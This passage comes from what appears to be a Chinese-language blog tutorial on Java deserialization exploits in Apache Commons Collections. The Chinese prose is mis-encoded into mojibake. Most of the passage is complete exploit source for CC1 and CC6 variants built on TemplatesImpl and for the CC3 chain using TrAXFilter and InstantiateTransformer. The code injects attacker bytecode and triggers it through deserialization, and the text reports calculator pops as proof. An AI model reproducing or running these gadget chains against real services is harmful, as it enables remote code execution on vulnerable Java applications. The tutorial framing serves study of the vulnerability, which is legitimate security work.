ConstantTransformer(templates)</code>ï¼Œè¿™ä¸ªç±»æ˜¯éœ€è¦æˆ‘ä»¬ä¼ å‚çš„ï¼Œä¼ å…¥ 1 å³å¯ã€‚</p><p>è¿™é‡Œæ˜¯å¯ä»¥å¼¹å‡ºè®¡ç®—å™¨çš„</p><p>é‚£æˆ‘ä»¬ä¸CC1å‰åŠæ®µé“¾å­ç»“åˆ</p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1EXPTemplatesImpl</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;a&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-comment">// templates.newTransformer();</span><br><br>        <span class="hljs-comment">//åå°„è°ƒç”¨newTransformer</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//chainedTransformer.transform(1);</span><br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">// è£…é¥°ä¸º TransformedMap</span><br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        <span class="hljs-comment">// æ„é€  AnnotationInvocationHandler</span><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        aihConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Target.class, transformedMap);<br><br>        <span class="hljs-comment">// è§¦å‘åºåˆ—åŒ– + ååºåˆ—åŒ–</span><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/CC3/c10.png"></p><h2 id="CC6-é“¾çš„-TemplatesImpl-çš„å®ç°æ–¹å¼"><a href="#CC6-é“¾çš„-TemplatesImpl-çš„å®ç°æ–¹å¼" class="headerlink" title="CC6 é“¾çš„ TemplatesImpl çš„å®ç°æ–¹å¼"></a>CC6 é“¾çš„ TemplatesImpl çš„å®ç°æ–¹å¼</h2><p>CC6ä¹ŸåŒç†ï¼Œåªéœ€è¦æ›´æ”¹åå°„è°ƒç”¨çš„æ–¹æ³•å³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6EXPTemplatesImpl</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;a&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-comment">// templates.newTransformer();</span><br><br>        <span class="hljs-comment">//åå°„è°ƒç”¨newTransformer</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//chainedTransformer.transform(1);</span><br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-comment">//å…ˆä¼ å…¥ä¸€ä¸ªæ²¡æœ‰ç”¨çš„transformer</span><br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-comment">//æ–°å»ºTiedMapEntryå®ä¾‹</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        tiedMapEntry.getValue();<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;bbb&quot;</span>);<br><br>        lazyMap.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">//åå°„ä¿®æ”¹lazyMapçš„å‚æ•°factoryçš„å€¼</span><br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factory.setAccessible(<span class="hljs-literal">true</span>);<br>        factory.set(lazyMap,chainedTransformer);<br><br><br>        <span class="hljs-comment">// è§¦å‘åºåˆ—åŒ– + ååºåˆ—åŒ–</span><br>        serialize(hashMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åŒæ ·é¡ºåˆ©å¼¹å‡ºè®¡ç®—å™¨</p><h2 id="å›å½’æ­£é¢˜-â€“-CC3-é“¾"><a href="#å›å½’æ­£é¢˜-â€“-CC3-é“¾" class="headerlink" title="å›å½’æ­£é¢˜ â€“ CC3 é“¾"></a>å›å½’æ­£é¢˜ â€“ CC3 é“¾</h2><h3 id="CC3-é“¾åˆ†æ"><a href="#CC3-é“¾åˆ†æ" class="headerlink" title="CC3 é“¾åˆ†æ"></a>CC3 é“¾åˆ†æ</h3><p>å› ä¸ºåªéœ€è¦è°ƒç”¨ <code>TemplatesImpl</code> ç±»çš„ <code>newTransformer()</code> æ–¹æ³•ï¼Œä¾¿å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å»åˆ° <code>newTransformer()</code> æ–¹æ³•ä¸‹ï¼ŒæŸ¥æ‰¾ç”¨æ³•</p><p><img src="/img/CC3/c11.png"></p><ul><li>è¿™é‡Œä¸»è¦æ˜¯æ‰¾åˆ°äº†å››ä¸ªï¼Œæˆ‘ä»¬ä¸€ä¸ªä¸ªè®²è§£ä¸€ä¸‹ä¸ºä»€ä¹ˆæ˜¯ <code>TrAXFilter</code> è€Œä¸æ˜¯å…¶ä»–çš„ã€‚</li></ul><p>Process è¿™ä¸ªåœ¨ main é‡Œé¢ï¼Œæ˜¯ä½œä¸ºä¸€èˆ¬å¯¹è±¡ç”¨çš„ï¼Œæ‰€ä»¥ä¸ç”¨å®ƒã€‚</p><p>ç¬¬äºŒä¸ª <code>getOutProperties</code>ï¼Œæ˜¯åå°„è°ƒç”¨çš„æ–¹æ³•ï¼Œå¯èƒ½ä¼šåœ¨ fastjson çš„æ¼æ´é‡Œé¢è¢«è°ƒç”¨ã€‚</p><p>TransformerFactoryImpl ä¸èƒ½åºåˆ—åŒ–ï¼Œå¦‚æœè¿˜æƒ³ä½¿ç”¨å®ƒä¹Ÿæ˜¯ä¹Ÿå¯èƒ½çš„ï¼Œä½†æ˜¯éœ€è¦ä¼ å‚(Runtime.exec)ï¼Œæˆ‘ä»¬éœ€è¦å»æ‰¾æ„é€ å‡½æ•°ã€‚è€Œå®ƒçš„æ„é€ å‡½æ•°éš¾ä¼ å‚ã€‚</p><p>æœ€åï¼Œ<code>TrAXFilter</code>ï¼Œå®ƒä¹Ÿæ˜¯ä¸èƒ½åºåˆ—åŒ–çš„ï¼Œä½†æ˜¯çœ‹åˆ°ä»–çš„æ„é€ å‡½æ•°</p><p><img src="/img/CC3/c12.png"></p><p>æ‰§è¡Œæ„é€ å‡½æ•°ï¼Œä¾¿å¯è°ƒç”¨newTransformeræ–¹æ³•</p><p>CC3 è¿™é‡Œçš„ä½œè€…æ²¡æœ‰è°ƒç”¨ <code>InvokerTransformer</code>ï¼Œè€Œæ˜¯è°ƒç”¨äº†ä¸€ä¸ªæ–°çš„ç±» <code>InstantiateTransformer</code>ã€‚</p><ul><li><code>InstantiateTransformer</code> è¿™ä¸ªç±»æ˜¯ç”¨æ¥åˆå§‹åŒ– <code>Transformer</code> çš„ï¼Œæˆ‘ä»¬å»æ‰¾ <code>InstantiateTransformer</code> ç±»ä¸‹çš„ <code>transform</code> æ–¹æ³•ã€‚</li></ul><h3 id="ç¼–å†™EXP-1"><a href="#ç¼–å†™EXP-1" class="headerlink" title="ç¼–å†™EXP"></a>ç¼–å†™EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-comment">// TemplatesImpl çš„ EXP ç¼–å†™</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates,<span class="hljs-string">&quot;enableTemplatesImplDeserialization&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br>        bytecodesField.set(templates,codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-comment">//templates.newTransformer();</span><br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        instantiateTransformer.transform(TrAXFilter.class);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†™åˆ°è¿™é‡Œæ˜¯å¯ä»¥ç›´æ¥å¼¹å‡ºè®¡ç®—å™¨çš„</p><p>ä¸CC1é“¾å­ç»“åˆï¼Œåˆ©ç”¨Transformerå’ŒChainedTransformerä¼ å…¥TrAXFilter.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">// TemplatesImpl çš„ EXP ç¼–å†™</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title 